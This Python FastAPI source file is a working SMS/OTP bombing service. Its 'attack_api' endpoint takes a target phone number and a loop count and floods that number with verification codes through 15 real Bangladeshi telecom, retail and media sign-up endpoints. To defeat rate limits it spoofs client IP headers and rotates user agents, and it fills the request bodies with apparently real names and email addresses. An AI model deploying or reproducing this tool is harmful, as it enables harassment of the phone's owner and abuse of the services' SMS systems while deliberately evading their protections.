# language: Python, file: main.py, target: Render
import asyncio
import random
from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import httpx

app = FastAPI(title="RASHIK API Server")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
)

API_OWNER = {
    "name": "Hasib Hossen (Ultra Speed Engine by RASHIK)",
    "purpose": "Educational API Testing"
}

# --- 🛡️ Bypassing Tools 🛡️ ---
def get_random_ip():
    """জেনারেট ফেক বাংলাদেশি/গ্লোবাল আইপি টু বাইপাস রেট লিমিট"""
    return f"{random.randint(103, 110)}.{random.randint(10, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def get_random_ua():
    """ডিভাইস স্পুফ করার জন্য রেন্ডম ইউজার এজেন্ট"""
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
    ]
    return random.choice(uas)

def get_apis(phone_str: str):
    last10 = phone_str[-10:]
    return [
        {
            'name': 'Coke Studio OTP',
            'url': 'https://cokestudio23.sslwireless.com/api/store-and-send-otp',
            'method': 'POST',
            'json': {'msisdn': '880' + last10, 'name': 'Aulad Hosen', 'email': 'uladhosenridoy@gmail.com', 'dob': '2000-01-01', 'occupation': 'N/A', 'gender': 'male'}
        },
        {
            'name': 'Grameenphone OTP',
            'url': 'https://weblogin.grameenphone.com/backend/api/v1/otp',
            'method': 'POST',
            'json': {'msisdn': '0' + last10}
        },
        {
            'name': 'Rabbit Hole OTP',
            'url': 'https://apix.rabbitholebd.com/appv2/login/requestOTP',
            'method': 'POST',
            'json': {'mobile': '+880' + last10}
        },
        {
            'name': 'Oshudpotro OTP',
            'url': 'https://api.osudpotro.com/api/v1/users/send_otp',
            'method': 'POST',
            'json': {'mobile': '+88-0' + last10, 'deviceToken': 'web', 'language': 'en', 'os': 'web'}
        },
        {
            'name': 'Fundesh OTP',
            'url': 'https://fundesh.com.bd/api/auth/generateOTP',
            'method': 'POST',
            'json': {'msisdn': last10},
            'params': {'service_key': ''}
        },
        {
            'name': 'Swap OTP',
            'url': 'https://api.swap.com.bd/api/v1/send-otp',
            'method': 'POST',
            'json': {'phone': '0' + last10}
        },
        {
            'name': 'Airtel Login OTP',
            'url': 'https://api.bd.airtel.com/v1/account/login/otp',
            'method': 'POST',
            'json': {'phone_number': '0' + last10}
        },
        {
            'name': 'Bikroy Login',
            'url': 'https://bikroy.com/data/phone_number_login/verifications/phone_login',
            'method': 'GET',
            'params': {'phone': '0' + last10}
        },
        {
            'name': 'Rokomari OTP',
            'url': 'https://www.rokomari.com/otp/send',
            'method': 'GET',
            'params': {'emailOrPhone': '880' + last10, 'countryCode': 'BD'}
        },
        {
            'name': 'eCourier OTP',
            'url': 'https://backoffice.ecourier.com.bd/api/web/individual-send-otp',
            'method': 'GET',
            'params': {'mobile': '0' + last10}
        },
        {
            'name': 'Prothom Alo OTP',
            'url': 'https://prod-api.viewlift.com/identity/signup',
            'method': 'POST',
            'json': {'requestType': 'send', 'phoneNumber': '+880' + last10, 'emailConsent': True, 'whatsappConsent': False},
            'params': {'site': 'prothomalo'}
        },
        {
            'name': 'Hoichoi OTP',
            'url': 'https://prod-api.viewlift.com/identity/signup',
            'method': 'POST',
            'json': {'requestType': 'send', 'phoneNumber': '+880' + last10, 'emailConsent': True, 'whatsappConsent': True},
            'params': {'site': 'hoichoitv'}
        },
        {
            'name': 'Paperfly Registration',
            'url': 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
            'method': 'POST',
            'json': {'full_name': 'Hjbdnd', 'company_name': 'Hello', 'email_address': 'uladhosen860@gmail.com', 'phone_number': '0' + last10}
        },
        {
            'name': 'Eon Bazar Registration',
            'url': 'https://app.eonbazar.com/api/auth/register',
            'method': 'POST',
            'json': {'mobile': '0' + last10, 'name': 'Hello', 'password': 'helloq', 'email': 'ajajsjfhcj@gmail.com'}
        },
        {
            'name': 'Sundarban Courier OTP',
            'url': 'https://tracking.sundarbancourierltd.com/PreBooking/SendPin',
            'method': 'POST',
            'json': {'PreBookingRegistrationPhoneNumber': '0' + last10}
        }
    ]

async def send_request(client: httpx.AsyncClient, api: dict):
    fake_ip = get_random_ip()
    headers = {
        "User-Agent": get_random_ua(),
        "X-Forwarded-For": fake_ip,
        "Client-IP": fake_ip,
        "X-Real-IP": fake_ip
    }
    
    # যদি কাস্টম হেডার থাকে, তবে সেটা যুক্ত করবে
    if 'headers' in api:
        headers.update(api['headers'])

    try:
        url = api['url']
        method = api['method']
        params = api.get('params')
        json_data = api.get('json')
        
        # Timeout কমিয়ে 4 সেকেন্ড করা হয়েছে, ডাউন API এর জন্য বসে থাকবে না
        if method == 'POST':
            res = await client.post(url, headers=headers, params=params, json=json_data, timeout=4.0)
        else:
            res = await client.get(url, headers=headers, params=params, timeout=4.0)
            
        return {
            'name': api['name'],
            'status': res.status_code,
            'success': 200 <= res.status_code < 300
        }
    except Exception as e:
        return {
            'name': api['name'],
            'status': "Timeout/Error",
            'success': False
        }

@app.get("/")
async def home():
    return {"message": "API is Live. Hit /api?phone=NUMBER&amount=1"}

@app.get("/api")
async def attack_api(
    phone: str = Query(..., description="Target Phone"), 
    amount: int = Query(1, description="Loop Count")
):
    if not phone.isdigit() or not (10 <= len(phone) <= 11):
        return JSONResponse(status_code=400, content={"owner": API_OWNER, "error": "Invalid phone number."})
        
    last10 = phone[-10:]
    apis = get_apis(phone)
    results = []
    success_count = 0
    
    async with httpx.AsyncClient(verify=False) as client:
        for _ in range(amount):
            tasks = [send_request(client, api) for api in apis]
            batch_results = await asyncio.gather(*tasks)
            
            results.extend(batch_results)
            success_count += sum(1 for r in batch_results if r['success'])
            
            if amount > 1:
                await asyncio.sleep(0.5) 
                
    return {
        'owner': API_OWNER,
        'request_info': {
            'formatted_phone': '0' + last10,
            'target_amount': amount,
            'total_requests_sent': len(results),
            'successful': success_count,
            'failed': len(results) - success_count,
        },
        'status': 'Process completed successfully.',
        'detailed_results': results
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000)
